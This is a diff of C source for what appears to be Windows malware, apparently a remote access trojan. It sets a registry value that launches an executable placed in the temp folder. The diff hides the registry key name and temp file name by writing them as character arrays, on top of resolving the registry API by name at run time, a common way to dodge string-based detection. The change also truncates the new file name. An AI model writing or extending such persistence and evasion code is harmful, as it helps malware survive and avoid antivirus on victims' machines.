@@ -382,10 +382,12 @@ int SetupRegistryKey(const char* execPath)
 	strncpy_s(regValue, lenRegValue, ca_command, lenCommand);
 	strncat_s(regValue, lenRegValue, execPath, lenExecPath);
 
+	char ca_keyName[] = { 'r','t','w','r','s','t',0 };
+	
 	char ca_RegSetValueExA[] = { 'R','e','g','S','e','t','V','a','l','u','e','E','x','A',0 };
 	_RegSetValueExA* f_RegSetValueExA = (_RegSetValueExA*)GetProcAddress(gLibraryKernel32, ca_RegSetValueExA);
 	LSTATUS regSetStatus = f_RegSetValueExA(keyHandle,
-										  "ratwurst",
+										  ca_keyName,
 										  0,
 										  REG_SZ,
 										  (const BYTE *)regValue,
@@ -431,7 +433,9 @@ WinMain(HINSTANCE hInstance,
 
 	char execPath[MAX_PATH + 9] = {};
 	strncpy_s(execPath, MAX_PATH, tempPath, strlen(tempPath));
-	strncat_s(execPath, "rtwst.tmp", 9);
+
+	char ca_tmpName[] = { 'r','t','w','r','s','t','.','t','m','p',0 };
+	strncat_s(execPath, ca_tmpName, 9);
 
 #if DEBUG	
 	if ( 0 )
